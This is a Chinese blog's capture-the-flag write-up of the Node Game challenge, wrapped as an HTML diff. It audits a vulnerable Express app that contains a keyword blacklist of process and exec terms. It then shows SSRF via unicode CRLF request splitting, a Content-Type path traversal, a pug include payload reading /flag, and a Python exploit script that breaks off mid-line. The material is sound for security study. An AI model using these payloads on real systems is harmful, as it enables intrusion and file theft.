@@ -1,0 +1,498 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="继续学习nodejs类型题目">
+  <meta name="author" content="Noel">
+  <meta name="keywords" content="">
+  
+  <title>GYCTF2020NodeGame - Noel&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"n0el4kls.github.io","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>N0el4kLs's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/web_source/shine.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="GYCTF2020NodeGame">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-08-25 02:05" pubdate>
+        2021年8月25日 凌晨
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.6k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      28
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">GYCTF2020NodeGame</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：1 分钟前
+                
+              </p>
+            
+            <div class="markdown-body">
+              <p>继续学习nodejs类型题目</p>
+<span id="more"></span>
+
+<h1 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h1><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[GYCTF2020]Node%20Game">[GYCTF2020]Node Game</a>    </p>
+<h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><p>进入题目,很容易拿到源码,直接开始审计</p>
+<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><code class="hljs javas">var express = require(&#x27;express&#x27;);<br>var app = express();<br>var fs = require(&#x27;fs&#x27;);<br>var path = require(&#x27;path&#x27;);<br>var http = require(&#x27;http&#x27;);<br>var pug = require(&#x27;pug&#x27;);<br>var morgan = require(&#x27;morgan&#x27;);<br>const multer = require(&#x27;multer&#x27;);<br>app.use(multer(&#123;<br>    dest: &#x27;./dist&#x27;<br>&#125;).array(&#x27;file&#x27;));<br>app.use(morgan(&#x27;short&#x27;));<br>app.use(&quot;/uploads&quot;, express.static(path.join(__dirname, &#x27;/uploads&#x27;))) <br>app.use(&quot;/template&quot;, express.static(path.join(<br>    __dirname, &#x27;/template&#x27;)));<br>    <br>app.get(&#x27;/&#x27;, function (req, res) &#123;<br>    var action = req.query.action ? req.query.action : &quot;index&quot;;<br>    if (action.includes(&quot;/&quot;) || action.includes(&quot;\\&quot;)) &#123;<br>        res.send(&quot;Errrrr, You have been Blocked&quot;);<br>    &#125;<br>    file = path.join(__dirname + &#x27;/template/&#x27; + action + &#x27;.pug&#x27;);<br>    var html = pug.renderFile(file);<br>    res.send(html);<br>&#125;);<br><br>app.post(&#x27;/file_upload&#x27;, function (req, res) &#123;<br>    var ip = req.connection.remoteAddress;<br>    var obj = &#123;<br>        msg: &#x27;&#x27;,<br>    &#125;<br>    if (!ip.includes(&#x27;127.0.0.1&#x27;)) &#123;<br>        obj.msg = &quot;only admin&#x27;s ip can use it&quot;<br>        res.send(JSON.stringify(obj));<br>        return<br>    &#125;<br>    fs.readFile(req.files[0].path, function (err, data) &#123;<br>        if (err) &#123;<br>            obj.msg = &#x27;upload failed&#x27;;<br>            res.send(JSON.stringify(obj));<br>        &#125; else &#123;<br>            var file_path = &#x27;/uploads/&#x27; + req.files[0].mimetype + &quot;/&quot;;<br>            var file_name = req.files[0].originalname<br>            var dir_file = __dirname + file_path + file_name<br>            if (!fs.existsSync(__dirname + file_path)) &#123;<br>                try &#123;<br>                    fs.mkdirSync(__dirname + file_path)<br>                &#125; catch (error) &#123;<br>                    obj.msg = &quot;file type error&quot;;<br>                    res.send(JSON.stringify(obj));<br>                    return<br>                &#125;<br>            &#125;<br>            try &#123;<br>                fs.writeFileSync(dir_file, data) obj = &#123;<br>                    msg: &#x27;upload success&#x27;,<br>                    filename: file_path + file_name<br>                &#125;<br>            &#125; catch (error) &#123;<br>                obj.msg = &#x27;upload failed&#x27;;<br>            &#125;<br>            res.send(JSON.stringify(obj));<br>        &#125;<br>    &#125;)<br>&#125;);<br><br>app.get(&#x27;/source&#x27;, function (req, res) &#123;<br>    res.sendFile(path.join(__dirname + &#x27;/template/source.txt&#x27;));<br>&#125;);<br><br>app.get(&#x27;/core&#x27;, function (req, res) &#123;<br>    var q = req.query.q;<br>    var resp = &quot;&quot;;<br>    if (q) &#123;<br>        var url = &#x27;http://localhost:8081/source?&#x27; + q console.log(url) <br>        var trigger = blacklist(url);<br>        if (trigger === true) &#123;<br>            res.send(&quot; error occurs!  &quot;);<br>        &#125; else &#123;<br>            try &#123;<br>                http.get(url, function (resp) &#123;<br>                    resp.setEncoding(&#x27;utf8&#x27;);<br>                    resp.on(&#x27;error&#x27;, function (err) &#123;<br>                        if (err.code === &quot;ECONNRESET&quot;) &#123;<br>                            console.log(&quot;Timeout occurs&quot;);<br>                            return;<br>                        &#125;<br>                    &#125;);<br>                    resp.on(&#x27;data&#x27;, function (chunk) &#123;<br>                        try &#123;<br>                            resps = chunk.toString();<br>                            res.send(resps);<br>                        &#125; catch (e) &#123;<br>                            res.send(e.message);<br>                        &#125;<br>                    &#125;).on(&#x27;error&#x27;, (e) =&gt; &#123;<br>                        res.send(e.message);<br>                    &#125;);<br>                &#125;);<br>            &#125; catch (error) &#123;<br>                console.log(error);<br>            &#125;<br>        &#125;<br>    &#125; else &#123;<br>        res.send(&quot;search param &#x27;q&#x27; missing!&quot;);<br>    &#125;<br>&#125;);<br><br>function blacklist(url) &#123;<br>    var evilwords = [&quot;global&quot;, &quot;process&quot;, &quot;mainModule&quot;, &quot;require&quot;, &quot;root&quot;, &quot;child_process&quot;, &quot;exec&quot;, &quot;\&quot;&quot;, &quot;&#x27;&quot;, &quot;!&quot;];<br>    var arrayLen = evilwords.length;<br>    for (var i = 0; i &lt; arrayLen; i++) &#123;<br>        const trigger = url.includes(evilwords[i]);<br>        if (trigger === true) &#123;<br>            return true<br>        &#125;<br>    &#125;<br>&#125;<br><br>var server = app.listen(8081, function () &#123;<br>    var host = server.address().address<br>    var port = server.address().port console.log(&quot;Example app listening at http://%s:%s&quot;, host, port)<br>&#125;)<br></code></pre></td></tr></table></figure>
+
+<p>发现,其中</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript">app.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> action = req.query.action ? req.query.action : <span class="hljs-string">&quot;index&quot;</span>;<br>    <span class="hljs-keyword">if</span> (action.includes(<span class="hljs-string">&quot;/&quot;</span>) || action.includes(<span class="hljs-string">&quot;\\&quot;</span>)) &#123;<br>        res.send(<span class="hljs-string">&quot;Errrrr, You have been Blocked&quot;</span>);<br>    &#125;<br>    file = path.join(__dirname + <span class="hljs-string">&#x27;/template/&#x27;</span> + action + <span class="hljs-string">&#x27;.pug&#x27;</span>);<br>    <span class="hljs-keyword">var</span> html = pug.renderFile(file);<br>    res.send(html);<br>&#125;);<br></code></pre></td></tr></table></figure>
+
+<p>存在用户可控参数<code>action</code>,且将<code>/template/$&#123;action&#125;.pug</code>的渲染结果返回.</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs javascript">app.post(<span class="hljs-string">&#x27;/file_upload&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> ip = req.connection.remoteAddress;<br>    <span class="hljs-keyword">var</span> obj = &#123;<br>        <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;&#x27;</span>,<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!ip.includes(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)) &#123;<br>        obj.msg = <span class="hljs-string">&quot;only admin&#x27;s ip can use it&quot;</span><br>        res.send(<span class="hljs-built_in">JSON</span>.stringify(obj));<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    fs.readFile(req.files[<span class="hljs-number">0</span>].path, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">err, data</span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (err) &#123;<br>            obj.msg = <span class="hljs-string">&#x27;upload failed&#x27;</span>;<br>            res.send(<span class="hljs-built_in">JSON</span>.stringify(obj));<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">var</span> file_path = <span class="hljs-string">&#x27;/uploads/&#x27;</span> + req.files[<span class="hljs-number">0</span>].mimetype + <span class="hljs-string">&quot;/&quot;</span>;<br>            <span class="hljs-keyword">var</span> file_name = req.files[<span class="hljs-number">0</span>].originalname<br>            <span class="hljs-keyword">var</span> dir_file = __dirname + file_path + file_name<br>            <span class="hljs-keyword">if</span> (!fs.existsSync(__dirname + file_path)) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    fs.mkdirSync(__dirname + file_path)<br>                &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>                    obj.msg = <span class="hljs-string">&quot;file type error&quot;</span>;<br>                    res.send(<span class="hljs-built_in">JSON</span>.stringify(obj));<br>                    <span class="hljs-keyword">return</span><br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">try</span> &#123;<br>                fs.writeFileSync(dir_file, data) obj = &#123;<br>                    <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;upload success&#x27;</span>,<br>                    <span class="hljs-attr">filename</span>: file_path + file_name<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>                obj.msg = <span class="hljs-string">&#x27;upload failed&#x27;</span>;<br>            &#125;<br>            res.send(<span class="hljs-built_in">JSON</span>.stringify(obj));<br>        &#125;<br>    &#125;)<br>&#125;);<br></code></pre></td></tr></table></figure>
+
+<p> 在<code>/file_upload</code>这个路由中,首先得绕过<code>ip.includes(&#39;127.0.0.1&#39;)</code></p>
+<p>之后,服务端通过对上传文件的<code>mime</code>类型创建了个<code>/upload/mimetype/</code>的目录,并且将上传的文件写入到这个目录.由于mime没有任何检测,这里可能存在目录穿越</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs javascript">app.get(<span class="hljs-string">&#x27;/core&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> q = req.query.q;<br>    <span class="hljs-keyword">var</span> resp = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">if</span> (q) &#123;<br>        <span class="hljs-keyword">var</span> url = <span class="hljs-string">&#x27;http://localhost:8081/source?&#x27;</span> + q <br>        <span class="hljs-built_in">console</span>.log(url) <br>        <span class="hljs-keyword">var</span> trigger = blacklist(url);<br>        <span class="hljs-keyword">if</span> (trigger === <span class="hljs-literal">true</span>) &#123;<br>            res.send(<span class="hljs-string">&quot; error occurs!  &quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                http.get(url, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">resp</span>) </span>&#123;<br>                    resp.setEncoding(<span class="hljs-string">&#x27;utf8&#x27;</span>);<br>                    resp.on(<span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">err</span>) </span>&#123;<br>                        <span class="hljs-keyword">if</span> (err.code === <span class="hljs-string">&quot;ECONNRESET&quot;</span>) &#123;<br>                            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Timeout occurs&quot;</span>);<br>                            <span class="hljs-keyword">return</span>;<br>                        &#125;<br>                    &#125;);<br>                    resp.on(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">chunk</span>) </span>&#123;<br>                        <span class="hljs-keyword">try</span> &#123;<br>                            resps = chunk.toString();<br>                            res.send(resps);<br>                        &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>                            res.send(e.message);<br>                        &#125;<br>                    &#125;).on(<span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> &#123;<br>                        res.send(e.message);<br>                    &#125;);<br>                &#125;);<br>            &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>                <span class="hljs-built_in">console</span>.log(error);<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        res.send(<span class="hljs-string">&quot;search param &#x27;q&#x27; missing!&quot;</span>);<br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure>
+
+<p>在<code>/core</code>这个路由,我们发现这里存在一个可控参数<code>q</code>,当<code>q</code> 不存在<code>blacklist()</code>的黑名单时,会给本地的<code>/source?+q</code>发一个<code>get</code>请求.这里就能对应<code>/file_upload</code>中的<code>ip.includes</code>了.</p>
+<h3 id="利用点"><a href="#利用点" class="headerlink" title="利用点"></a>利用点</h3><p>利用点就是<code>/core</code>中的<code>http.get</code>,存在 SSRF .原题题目其实还强调了Node的版本为<code> 8.12.0</code>,但是buu中好像并没有这个提示.</p>
+<p>搜索会发现此版本的Node http模块存在个洞:</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2894#toc-2">https://xz.aliyun.com/t/2894#toc-2</a>.</p>
+<p>总结下就是</p>
+<p>Node.js默认使用“latin1”,这是一种单字节编码,不能表示高编号的unicode字符.</p>
+<p>通过 <code>unicode编码字符</code>能够欺骗服务器.</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">&gt; http.get(&#x27;http://example.com/<span class="hljs-symbol">\u</span>010D<span class="hljs-symbol">\u</span>010A/test&#x27;).output<br>[ &#x27;GET /čĊ/test HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Host: example.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Connection: close<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>&#x27; ]<br></code></pre></td></tr></table></figure>
+
+<p>根据这个漏洞我们可以构造<code>crlf</code>注入文件上传.再配合路径穿越,使得<code>html = pug.renderFile(file)</code>读取到flag就行.</p>
+<p>关于pug基本语法,大家可以到以下网站去做了解</p>
+<p><a target="_blank" rel="noopener" href="https://pugjs.org/zh-cn/language/includes.html">https://pugjs.org/zh-cn/language/includes.html</a></p>
+<h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><p>先用bp抓包一次正常上传.</p>
+<p><img src="../images/2021-08-25-GYCTF2020NodeGame/image-20210825025723085.png" srcset="/img/loading.gif" lazyload alt="image-20210825025723085"></p>
+<p>构造需要上传的文件<code>payload.pug</code>,内容如下</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle">doctype html<br>html<br>    <span class="hljs-keyword">include</span> ..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>../flag<br></code></pre></td></tr></table></figure>
+
+<p>上传一次</p>
+<p><img src="../images/2021-08-25-GYCTF2020NodeGame/image-20210825030726420.png" srcset="/img/loading.gif" lazyload alt="image-20210825030726420"></p>
+<p>这里下需要将<code>Content-Type</code>更改为<code>/../template</code>以达成目录穿越</p>
+<p>再利用脚本对里面的检测字符用<code>unicode编码</code>替换</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><br>payload = <span class="hljs-string">&quot;&quot;&quot; HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Connection: keep-alive</span><br><span class="hljs-string"></span><br><span class="hljs-string">POST /file_upload HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Length: &#123;&#125;</span><br><span class="hljs-string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3iVT9Dx93D0N0IkI</span><br><span class="hljs-string">Connection: keep-alive</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#123;&#125;&quot;&quot;&quot;</span>.replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;\r\n&#x27;</span>)<br><br>body = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">------WebKitFormBoundary3iVT9Dx93D0N0IkI</span><br><span class="hljs-string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;payload.pug&quot;</span><br><span class="hljs-string">Content-Type: ../template</span><br><span class="hljs-string"></span><br><span class="hljs-string">doctype html</span><br><span class="hljs-string">html</span><br><span class="hljs-string">    include ../../../../../../../../../../../flag</span><br><span class="hljs-string">------WebKitFormBoundary3iVT9Dx93D0N0IkI--</span><br><span class="hljs-string">&quot;&quot;&quot;</span>.replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;\r\n&#x27;</span>)<br><br><br>payload = payload.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">len</span>(body), body)   \<br>        .replace(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\u0120&#x27;</span>)             \<br>        .replace(<span class="hljs-string">&#x27;\r\n&#x27;</span>, <span class="hljs-string">&#x27;\u010d\u010a&#x27;</span>)    \<br>        .replace(<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;\u0122&#x27;</span>)             \<br>        .replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&#x27;\u0127&#x27;</span>)             \<br>        .replace(<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-string">&#x27;\u015b&#x27;</span>)             \<br>        .replace(<span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-string">&#x27;\u015d&#x27;</span>)             \<br>        .replace(<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;\u0128&#x27;</span>)             \<br>        + <span class="hljs-string">&#x27;GET&#x27;</span> + <span class="hljs-string">&#x27;\u0120&#x27;</span> + <span class="hljs-string">&#x27;/&#x27;</span><br><br><span class="hljs-built_in">print</span>(requests.get(<span class="hljs-string">&#x27;http://ffd47bd9-d569-4849-a0cf-0a140bd5de28.node4.buuoj.cn:81/core?q=&#x27;</span> + 